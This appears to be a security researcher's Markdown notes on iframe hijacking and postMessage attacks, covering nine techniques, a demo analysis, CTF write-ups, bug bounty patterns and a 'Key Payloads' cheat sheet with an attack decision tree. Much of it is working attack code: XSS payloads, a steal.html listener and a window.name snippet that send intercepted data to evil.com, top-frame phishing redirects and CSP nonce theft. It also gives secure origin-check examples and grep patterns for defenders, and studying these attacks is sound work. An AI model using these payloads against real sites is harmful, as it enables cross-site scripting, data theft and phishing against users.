# Iframe Hijacking Research

## Table of Contents
- [Core Concepts](#core-concepts)
- [Technique 1: Named Window/Frame Hijacking](#technique-1-named-windowframe-hijacking)
- [Technique 2: Inner Iframe Navigation (Message Interception)](#technique-2-inner-iframe-navigation-message-interception)
- [Technique 3: Sandbox + Null Origin Bypass](#technique-3-sandbox--null-origin-bypass)
- [Technique 4: event.source Nullification](#technique-4-eventsource-nullification)
- [Technique 5: Origin Check Bypass Patterns](#technique-5-origin-check-bypass-patterns)
- [Technique 6: window.name Persistence (Chromium)](#technique-6-windowname-persistence-chromium)
- [Technique 7: iframe srcdoc Exploitation](#technique-7-iframe-srcdoc-exploitation)
- [Technique 8: Frame Navigation for Phishing](#technique-8-frame-navigation-for-phishing)
- [Technique 9: CSP Bypass via iframes](#technique-9-csp-bypass-via-iframes)
- [Demo Analysis (attacker.html / victim.html)](#demo-analysis)
- [CTF Writeups](#ctf-writeups)
- [Bug Bounty Patterns](#bug-bounty-patterns)
- [Cheat Sheet](#cheat-sheet)
- [Sources](#sources)

---

## Core Concepts

### What is Iframe Hijacking?

Iframe hijacking is a class of client-side attacks where an attacker manipulates iframe or window references to:
- **Intercept postMessage communications** meant for another frame
- **Navigate frames** to attacker-controlled pages
- **Bypass origin checks** using sandbox null origin tricks
- **Steal data** by hijacking the target of cross-window messages

### Cross-Origin Window Properties (What's accessible)

Even cross-origin, these properties are accessible on a window reference:

| Readable | Writable | Callable |
|----------|----------|----------|
| `window.closed` | `location.href` | `window.focus()` |
| `window.frames` | `location.replace()` | `window.blur()` |
| `window.length` | | `window.postMessage()` |
| `window.top` | | |
| `window.opener` | | |
| `window.parent` | | |

**Key insight:** You can always navigate a frame's location cross-origin and send it postMessages. This is the foundation of most iframe hijacking attacks.

### How `window.open(url, name)` Works

```javascript
// If a window/frame named "myframe" already exists → reuses it (navigates it)
// If it doesn't exist → creates a new window with that name
let ref = window.open("https://evil.com", "myframe");
```

This also applies to:
- `<a target="myframe">`
- `<form target="myframe">`
- `<iframe name="myframe">`

If a window with that name exists **anywhere** in the browsing context tree, `window.open` returns a reference to it instead of creating a new one.

---

## Technique 1: Named Window/Frame Hijacking

### The Attack

If a victim page has a named iframe (`<iframe name="X">`), an attacker who opens that page can hijack the named frame using `window.open(url, "X")`.

### How It Works

1. Attacker opens victim page (which contains `<iframe name="myframe">`)
2. Attacker calls `window.open("attacker.html", "myframe")`
3. The browser finds the existing frame named "myframe" inside the victim page
4. Instead of opening a new window, it navigates that iframe to attacker.html
5. Attacker now has a reference to the frame and can interact with it

### Code Example (from our demo)

**attacker.html:**
```javascript
function openNewTab() {
    // 1. Open victim.html (which contains <iframe name="myframe">)
    window.open("victim.html", "_blank", "width=500,height=500");

    // 2. Hijack the iframe by targeting its name
    setTimeout(function() {
        let x = window.open("victim.html", "myframe");

        // 3. postMessage to the hijacked context
        setTimeout(function() {
            x.postMessage("<img src=x onerror=alert(1)>", '*');
        }, 2000);
    }, 2000);
}
```

**victim.html:**
```html
<iframe name="myframe" src="random.html" width="500" height="500"></iframe>
<script>
    window.addEventListener('message', function(e) {
        // No origin check! Writes directly to innerHTML
        document.body.innerHTML += "<p>" + e.data + "</p>";
    });
</script>
```

### Why This Works
- The victim has an insecure postMessage listener (no origin check, writes to innerHTML)
- The named iframe "myframe" can be targeted from the attacker's context
- `window.open("victim.html", "myframe")` navigates the iframe and returns a reference
- The attacker can then postMessage the XSS payload to the victim

### WHATWG Spec Issue (#1509)

There's a documented spec-level vulnerability: when multiple frames share the same name, the browser's selection order is ambiguous. The spec says browsers "should select one in some arbitrary consistent manner." This means:

- Attacker frames a legitimate page on their domain
- Uses the same iframe name as one inside the legitimate page
- `window.open(javascript_url, "shared_name")` may select the attacker's frame
- JavaScript executes in the legitimate domain's context → XSS

**Partial fix:** Firefox and Chrome now give top-level browsing contexts their own name bucket.

---

## Technique 2: Inner Iframe Navigation (Message Interception)

### The Attack

If a target page is framable AND it sends postMessages to an inner iframe, an attacker can navigate that inner iframe to intercept the messages.

### How It Works

1. Target page loads inner iframe and sends it sensitive data via postMessage
2. Attacker iframes the target page on their domain
3. Attacker navigates the inner iframe to their own page: `target.frames[0].location = "https://evil.com/steal.html"`
4. The target page still sends postMessage to `frames[0]`, but that's now the attacker's page
5. Attacker receives the sensitive data

### Code Example

```html
<!-- attacker.html -->
<iframe id="target" src="https://victim.com/page-with-inner-iframe"></iframe>
<script>
    let target = document.getElementById("target");

    // Wait for target to load
    setTimeout(() => {
        // Navigate the inner iframe to our page
        target.contentWindow.frames[0].location = "https://evil.com/steal.html";
    }, 2000);
</script>
```

```html
<!-- steal.html (on evil.com) -->
<script>
    window.addEventListener('message', function(e) {
        // Intercept messages meant for the original inner iframe
        fetch('https://evil.com/log?data=' + encodeURIComponent(e.data));
    });
</script>
```

### Conditions Required
- Target page must be framable (no `X-Frame-Options` / `frame-ancestors` CSP)
- Target must send postMessage with wildcard origin (`*`)
- Target must have an inner iframe whose location can be changed

### Alternative: Using `window.open` Instead of Iframing

If the target has `X-Frame-Options` preventing iframing, you can still:
```javascript
let w = window.open("https://victim.com/page");
setTimeout(() => {
    // Navigate inner iframe
    w.frames[0].location = "https://evil.com/steal.html";
}, 2000);
```

---

## Technique 3: Sandbox + Null Origin Bypass

### The Attack

The `sandbox` attribute forces iframed content to have `window.origin === "null"`. If a victim page checks `e.origin === window.origin`, both being "null" satisfies the check.

### How It Works

1. Many pages validate postMessage like: `if (e.origin !== window.origin) return;`
2. When sandboxed, `window.origin` becomes the string `"null"`
3. Attacker creates a sandboxed iframe → its origin is `"null"`
4. Messages from the sandbox have `e.origin === "null"`
5. `"null" === "null"` → origin check passes

### Code Example

```html
<!-- attacker.html -->
<iframe
    sandbox="allow-scripts allow-popups"
    srcdoc="
        <script>
            // Open the victim page as a popup
            let w = window.open('https://victim.com/page');
            setTimeout(() => {
                // Both origins are 'null' - bypasses origin check!
                w.postMessage('malicious_payload', '*');
            }, 2000);
        </script>
    ">
</iframe>
```

### Popup Inheritance

Windows opened from sandboxed iframes **inherit the sandbox restrictions**:
- `allow-popups` → popup opens but is also sandboxed
- The popup's `window.origin` is also `"null"`
- To break out: use `allow-popups-to-escape-sandbox`

### Combined with Navigation

```html
<iframe sandbox="allow-scripts allow-popups allow-top-navigation" srcdoc="
    <script>
        let w = window.open('https://victim.com/vulnerable');
        setTimeout(() => {
            // Stage 1: Send XSS payload (origin check bypassed)
            w.postMessage({type:'render', body:'<img src=x onerror=alert(1)>'}, '*');

            // Stage 2: Navigate top for credential theft
            top.location = 'https://evil.com/phish';
        }, 2000);
    </script>
"></iframe>
```

---

## Technique 4: event.source Nullification

### The Attack

Some pages validate postMessage by checking `event.source` (the window that sent the message). Attackers can make `event.source === null` by immediately destroying the sending iframe.

### How It Works

1. Victim page checks: `if (event.source !== someExpectedWindow) return;`
2. Or checks: `if (event.source === null) return;` (less common, good defense)
3. Attacker creates an iframe that sends postMessage then immediately removes itself
4. By the time the message handler runs, `event.source` is `null`

### Code Example

```html
<!-- attacker.html -->
<script>
    function sendAndDestroy(target, message) {
        let iframe = document.createElement('iframe');
        iframe.srcdoc = `
            <script>
                parent.postMessage('${message}', '*');
            <\/script>
        `;
        document.body.appendChild(iframe);

        // Remove immediately - event.source becomes null
        setTimeout(() => iframe.remove(), 0);
    }

    // If victim checks: event.source !== expectedWindow
    // null !== expectedWindow → may or may not pass depending on logic
    sendAndDestroy(window, 'malicious_payload');
</script>
```

### When This Matters
- Pages that use `event.source` to verify the sender is a specific known window
- Pages that reply back to `event.source.postMessage()` (will throw if null)
- Pages that do `if (!event.source)` as a "security" check (easily bypassed)

---

## Technique 5: Origin Check Bypass Patterns

### Flawed Patterns

**1. `indexOf()` check:**
```javascript
// VULNERABLE
if (e.origin.indexOf('legitimate.com') > -1) { ... }

// Bypass: attacker hosts on legitimate.com.evil.net
// "https://legitimate.com.evil.net".indexOf('legitimate.com') → 8 (passes!)
```

**2. `endsWith()` check:**
```javascript
// VULNERABLE
if (e.origin.endsWith('legitimate.com')) { ... }

// Bypass: attacker hosts on evil-legitimate.com
// "https://evil-legitimate.com".endsWith('legitimate.com') → true
```

**3. Regex without anchoring:**
```javascript
// VULNERABLE
if (/legitimate\.com/.test(e.origin)) { ... }

// Bypass: same as indexOf - any URL containing the string passes
```

**4. startsWith on wrong part:**
```javascript
// VULNERABLE
if (e.origin.startsWith('https://legitimate.com')) { ... }

// Bypass: https://legitimate.com.evil.net still starts with it
```

### Correct Origin Validation

```javascript
window.addEventListener('message', function(e) {
    // CORRECT: Exact match
    if (e.origin !== 'https://legitimate.com') return;

    // Or allowlist
    const allowed = ['https://app.legitimate.com', 'https://legitimate.com'];
    if (!allowed.includes(e.origin)) return;

    // Process message...
});
```

---

## Technique 6: window.name Persistence (Chromium)

### The Attack

In Chromium, `window.name` persists across cross-origin navigations (bug unfixed since 2017, Chromium Issue 706350). Firefox and Safari correctly clear it.

### How It Works

1. Attacker page sets `window.name = "malicious_payload"`
2. Page navigates to victim site
3. Victim site reads `window.name` → gets attacker's payload
4. If victim does `eval(window.name)` or `innerHTML = window.name` → XSS

### Code Example

```html
<!-- attacker.html -->
<script>
    window.name = '<img src=x onerror=alert(document.cookie)>';
    window.location = 'https://victim.com/page-that-reads-window-name';
</script>
```

### Exploitation for Data Exfiltration

```javascript
// On victim page, if there's: document.getElementById('x').innerHTML = window.name
// Or even: some framework reads window.name for state

// Attacker can also use window.name to EXFILTRATE:
// Victim page: window.name = secretData; location = 'https://evil.com/read'
// Evil page: alert(window.name) → reads the secret
```

---

## Technique 7: iframe srcdoc Exploitation

### The Attack

The `srcdoc` attribute inherits the parent's origin and HTML-decodes its content, meaning escaped entities become executable.

### Key Properties
- `srcdoc` content inherits the parent page's origin (unlike `data:` URIs which get null origin)
- HTML entity encoding in `srcdoc` gets decoded during parsing
- `&lt;script&gt;alert(1)&lt;/script&gt;` becomes `<script>alert(1)</script>`

### Code Example

```html
<!-- If attacker can inject srcdoc attribute: -->
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>

<!-- The script executes in the PARENT's origin! -->
```

### CSP Interaction
- `srcdoc` is governed by `script-src`, not `frame-src`
- If CSP allows `'unsafe-inline'` for scripts, srcdoc scripts execute
- The iframe `csp` attribute can apply stricter policies to embedded content

---

## Technique 8: Frame Navigation for Phishing

### The Attack

Using `allow-top-navigation` in sandbox, or through an unsandboxed frame, an attacker can redirect the entire page.

### Code Example

```html
<!-- If victim page has a framable page: -->
<iframe src="https://victim.com/dashboard"></iframe>
<script>
    // After user is comfortable seeing the real page...
    setTimeout(() => {
        // Navigate the entire page to a phishing page
        document.querySelector('iframe').contentWindow.top.location = 'https://evil.com/fake-login';
    }, 5000);
</script>
```

### Via Sandbox

```html
<iframe
    sandbox="allow-scripts allow-top-navigation-by-user-activation"
    src="https://evil.com/clickjack.html">
</iframe>
<!-- User clicks anything → evil page can navigate top to phishing page -->
```

---

## Technique 9: CSP Bypass via iframes

### Nonce Theft (Same-Origin)

If you can inject a same-origin iframe, you can steal the parent's CSP nonce:
```javascript
// Inside same-origin iframe:
let nonce = parent.document.querySelector('[nonce]').nonce;
let script = document.createElement('script');
script.nonce = nonce;
script.textContent = 'alert(1)';
parent.document.body.appendChild(script);
```

### History-Based CSP Bypass (idekCTF 2024)

1. Load a sandboxed iframe with XSS payload (no CSP on initial load)
2. Navigate away, replacing content with empty iframe (removing sandbox)
3. `history.back()` → iframe content returns but **CSP inherits from previous (empty) state**
4. Sandbox is gone + CSP is empty → script executes

### Dangling Markup via iframe name

```html
<!-- Inject unclosed iframe tag to leak data: -->
<iframe name="
<!-- Everything after this until a closing quote becomes part of window.name -->
<!-- Can leak tokens, CSRF tokens, etc. -->
```

---

## Demo Analysis

### attacker.html Breakdown

The demo shows **Technique 1 (Named Window Hijacking)** combined with **postMessage XSS**.

**Attack Flow:**
```
attacker.html                          victim.html
     |                                      |
     |--- window.open(victim, _blank) ----->|  (Step 1: Open victim in new tab)
     |                                      |  victim loads with <iframe name="myframe">
     |                                      |
     |--- window.open(victim, "myframe") -->|  (Step 2: Hijack iframe by name)
     |    returns reference (x)             |  iframe navigates to victim.html
     |                                      |
     |--- x.postMessage(XSS_payload, *) --->|  (Step 3: Send XSS payload)
     |                                      |  victim's message listener fires
     |                                      |  innerHTML += e.data (no sanitization)
     |                                      |  XSS: <img src=x onerror=alert(1)>
```

### victim.html Vulnerabilities

1. **No origin check on postMessage listener** → any origin can send messages
2. **Direct innerHTML sink** → `document.body.innerHTML += "<p>" + e.data + "</p>"`
3. **Named iframe** → `<iframe name="myframe">` exposes a hijackable target

### Alternative Approach (Commented Code)

The commented-out code shows another method:
```javascript
// Using an iframe on attacker's page instead of window.open
var x = window.open("victim.html", "myframe");
setTimeout(function() {
    x.frames[0].location.href = "victim.html"; // Navigate inner iframe
}, 2000);
setTimeout(function() {
    x.frames[0].postMessage("badr", '*'); // Message the inner iframe
}, 2500);
```

This targets `frames[0]` (the inner iframe) directly using cross-origin navigation.

---

## CTF Writeups

### idekCTF 2024 - Advanced iframe Magic

**Technique:** History-based CSP + Sandbox bypass
**Key insight:** When navigating back via `history.back()`, the sandbox attribute follows the latest page state, but CSP inherits from the session history entry. This desynchronization allows:
1. Load sandboxed iframe with XSS payload (empty CSP)
2. Navigate away (remove sandbox)
3. `history.back()` → payload returns, sandbox gone, CSP still empty
4. Script executes

**Source:** https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/

### Intigriti 0721 XSS Challenge

**Technique:** DOM Clobbering + postMessage + CSP bypass
**Key insight:** Multi-stage attack combining:
1. DOM clobbering to forge `top.DEV` and `top.store.users` credentials
2. postMessage to reassign internal functions (sanitizer → unescaper)
3. Undeclared loop variable (`for (x of ...)`) leaking to global scope
4. CSP bypass via `%2f` path traversal under whitelisted `/analytics/` path
5. iframe srcdoc for script execution (innerHTML doesn't execute `<script>` tags)

**Source:** https://github.com/aszx87410/ctf-writeups/issues/39

### Pwn2win 2021 - Hackus (HackMD Exploit)

**Technique:** iframe injection + postMessage + CSP bypass + cache exploitation
**Key insight:** Exploited HackMD's Reveal.js plugin which used `postMessage('*')`:
1. Injected two iframes in a HackMD note (one loading secret, one loading evil.com)
2. Bypassed CSP using google-analytics.com allowlist entry
3. Used `fetch` with `force-cache` to read the admin's cached secret note

**Source:** https://www.kalmarunionen.dk/writeups/2021/pwn2win/hackus/

### DiceCTF 2021 - Web IDE

**Technique:** window.open + cross-origin document access
**Key insight:** `window.open` returns a reference to the new window. If same-origin, you can read `newWindow.document.cookie` directly.

**Source:** https://ctftime.org/writeup/25989

### BugPoC/Amazon XSS CTF

**Technique:** window.name manipulation
**Key insight:** Set `window.name = 'iframe'` before redirecting to the target page to bypass a `window.name` check. The name persists across navigation in Chromium.

**Source:** https://vamitrou.medium.com/bugpoc-amazon-xss-ctf-write-up-6f2d43909294

---

## Bug Bounty Patterns

### Pattern 1: postMessage to innerHTML Without Origin Check

**Frequency:** Most common pattern (56% of findings in our knowledge base)

```javascript
// VULNERABLE
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});
```

**Exploit:** Iframe or `window.open` the page → send XSS payload via postMessage.

### Pattern 2: postMessage with Wildcard Target and Sensitive Data

```javascript
// VULNERABLE - Sends auth token to ANY listening parent/opener
window.opener.postMessage({token: authToken}, '*');
```

**Exploit:** Open the page via `window.open` from attacker's page → `window.opener` is attacker → attacker receives the token.

### Pattern 3: Framable Pages with Inner iframe Communication

```javascript
// page.html (framable, no X-Frame-Options)
let inner = document.querySelector('iframe');
inner.contentWindow.postMessage(sensitiveData, '*');
```

**Exploit:** Iframe the page → navigate inner iframe to attacker's page → intercept the postMessage.

### Pattern 4: signIn/signOut Redirect Parameters

```javascript
// VULNERABLE
let redirectTo = new URLSearchParams(location.search).get('redirectTo');
window.location.href = redirectTo; // Open redirect
// Or worse:
document.body.innerHTML = '<a href="' + redirectTo + '">Click here</a>'; // XSS via javascript:
```

### Pattern 5: Named iframes in Third-Party Widgets

SDKs and widgets often create named iframes for cross-domain communication. These names are predictable and can be hijacked:
```html
<!-- Facebook SDK, payment widgets, chat widgets often create: -->
<iframe name="fb_xdm_frame_https" ...>
<iframe name="stripe_checkout" ...>
```

---

## Cheat Sheet

### Quick Attack Decision Tree

```
Target has postMessage listener?
├── No origin check? → Send payload from attacker iframe/window.open
├── Origin check with indexOf/endsWith? → Register lookalike domain to bypass
├── Origin check with === ? → Try sandbox null origin trick
└── Checks event.source? → Try iframe delete trick (e.source = null)

Target sends postMessage with * ?
├── Page is framable? → Iframe it, receive messages on attacker page
├── Has inner iframe? → Navigate inner iframe to attacker page
└── Uses window.opener? → Open page via window.open, receive on opener

Target has named iframes?
├── Predictable name? → window.open(url, "name") to hijack
└── Widget/SDK iframe? → Check if name is documented/guessable

Target reads window.name?
└── Chromium? → Set window.name on attacker page, redirect to target
```

### Key Payloads

```javascript
// Named frame hijack + postMessage XSS
window.open("victim.html", "_blank");
setTimeout(() => {
    let x = window.open("javascript:void(0)", "targetFrameName");
    x.postMessage('<img src=x onerror=alert(1)>', '*');
}, 2000);

// Sandbox null origin bypass
<iframe sandbox="allow-scripts allow-popups" srcdoc="
    <script>
        let w = window.open('https://victim.com');
        setTimeout(() => w.postMessage('payload', '*'), 2000);
    </script>
"></iframe>

// Inner iframe navigation (message interception)
<iframe id=f src="https://victim.com/page-with-iframe"></iframe>
<script>
    setTimeout(() => {
        document.getElementById('f').contentWindow.frames[0].location =
            'https://evil.com/steal.html';
    }, 2000);
</script>

// event.source nullification
let f = document.createElement('iframe');
f.srcdoc = "<script>parent.postMessage('xss','*')<\/script>";
document.body.appendChild(f);
setTimeout(() => f.remove(), 10);

// window.name data exfiltration
window.name = JSON.stringify(stolenData);
location = 'https://evil.com/exfil';
```

### What to Look For (grep patterns)

```bash
# postMessage listeners without origin checks
rg "addEventListener.*message" --type js
rg "\.on\(.*message" --type js

# Dangerous sinks in message handlers
rg "innerHTML.*e\.data|innerHTML.*event\.data" --type js
rg "document\.write.*message" --type js

# Wildcard postMessage sends
rg "postMessage\(.*,\s*'\*'\)" --type js

# Named iframes (hijack targets)
rg 'name="[^"]*"' --type html -g '*.html'
rg "iframe.*name=" --type html

# window.name reads
rg "window\.name" --type js

# Frame navigation
rg "frames\[" --type js
rg "\.contentWindow" --type js
```

---

## Sources

- [Huli - iframe and window.open magic](https://blog.huli.tw/2022/04/07/en/iframe-and-window-open/) - Comprehensive reference on iframe/window.open security properties
- [Huli - idekCTF 2024 Advanced iframe Magic](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/) - History-based CSP + sandbox bypass
- [HackTricks - Iframes in XSS, CSP and SOP](https://book.hacktricks.wiki/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp.html) - CSP bypass, sandbox exploitation, credentialless iframes
- [HackTricks - Bypassing SOP with Iframes](https://book.hacktricks.wiki/pentesting-web/postmessage-vulnerabilities/bypassing-sop-with-iframes-1.html) - Null origin bypass, popup inheritance
- [PortSwigger - Controlling the Web Message Source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) - Origin verification bypasses
- [Jorge Lajara - PostMessage Vulnerabilities Part I](https://jlajara.gitlab.io/Dom_XSS_PostMessage) - DOM XSS via postMessage
- [WHATWG HTML Issue #1509](https://github.com/whatwg/html/issues/1509) - window.open name collision XSS vulnerability
- [OWASP - Cross Frame Scripting](https://owasp.org/www-community/attacks/Cross_Frame_Scripting) - XFS attack patterns
- [Pwn2win 2021 Hackus Writeup](https://www.kalmarunionen.dk/writeups/2021/pwn2win/hackus/) - HackMD iframe + postMessage exploit chain
- [Intigriti 0721 Challenge Writeup](https://github.com/aszx87410/ctf-writeups/issues/39) - DOM clobbering + postMessage multi-stage XSS
- [BugPoC/Amazon XSS CTF](https://vamitrou.medium.com/bugpoc-amazon-xss-ctf-write-up-6f2d43909294) - window.name bypass
- [DiceCTF 2021 Web IDE](https://ctftime.org/writeup/25989) - window.open cross-origin access
- [Practical CTF - postMessage Exploitation](https://book.jorianwoltjer.com/languages/javascript/postmessage-exploitation) - Frame hijacking for message interception
- [Invicti - Frame Injection Attacks](https://www.invicti.com/blog/web-security/frame-injection-attacks) - Frame hijacking taxonomy
- [CVE-2024-44187](https://www.cve.news/cve-2024-44187/) - Cross-origin data exfiltration via iframe elements
